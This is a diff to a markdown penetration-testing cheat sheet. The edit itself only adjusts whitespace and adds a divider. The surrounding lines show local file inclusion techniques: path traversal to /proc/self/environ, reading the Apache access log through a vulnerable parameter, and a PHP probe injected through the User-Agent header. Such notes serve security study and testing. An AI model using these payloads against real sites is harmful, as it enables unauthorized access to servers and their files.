@@ -178,6 +178,7 @@ Host: <target>
 
 <?php phpinfo(); ?>
 ```
+
 **access_log**
 
 If you find the access log, you can make a GET request with your php code :
@@ -187,7 +188,6 @@ Host: <target>
 
 GET <targeturi>/<vulnrable_paramter>=/var/log/apache2/access.log
 Host: <target>
-
 ```
 
 **proc/self/environ**
@@ -198,6 +198,8 @@ Send the payload into User-Agent, and browse the /proc/self/environ file :
 GET <target>?page=../../../proc/self/environ HTTP/1.1
 User-Agent: <?php phpinfo(); ?>
 ```
+
+---
 
 ## **Injections**
 
